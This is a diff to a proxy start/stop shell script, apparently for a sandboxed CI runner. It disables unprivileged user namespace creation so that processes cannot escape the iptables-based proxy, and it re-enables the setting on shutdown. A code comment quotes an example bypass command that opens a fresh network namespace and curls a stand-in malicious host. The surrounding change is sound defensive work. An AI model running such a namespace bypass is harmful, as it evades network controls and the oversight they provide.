@@ -49,6 +49,21 @@ start_proxy() {
     # Cleanup iptables on failure to avoid breaking runner communication
     trap '"$SCRIPT_DIR"/iptables.sh cleanup' ERR
 
+    # Block network namespace creation to prevent iptables bypass.
+    #
+    # Without this, an attacker could run:
+    #   unshare --user --net bash -c "curl https://malicious.com"
+    # The new network namespace has no iptables rules, completely bypassing our proxy.
+    #
+    # Setting unprivileged_userns_clone=0 blocks unprivileged users from creating
+    # user namespaces (which are needed to create other namespaces without root).
+    # This does NOT affect Docker (daemon runs as root with CAP_SYS_ADMIN).
+    #
+    # Combined with disabling sudo (planned), this blocks ALL netns creation:
+    # - Unprivileged: blocked by this sysctl
+    # - Privileged: requires sudo which will be disabled
+    sysctl -w kernel.unprivileged_userns_clone=0 >/dev/null
+
     # Start proxy in its own cgroup scope using systemd-run
     # This allows iptables to exclude proxy traffic by cgroup instead of UID,
     # enabling us to capture traffic from root processes (like docker --network=host)
@@ -109,6 +124,9 @@ start_proxy() {
 
 stop_proxy() {
     echo "=== stop_proxy ===" | tee -a /tmp/proxy.log
+
+    # Restore unprivileged user namespace creation (cleanup)
+    sysctl -w kernel.unprivileged_userns_clone=1 >/dev/null 2>&1 || true
 
     # First try graceful shutdown via pidfile (allows cleanup before systemd kills the scope)
     if [ -f "$PIDFILE" ]; then
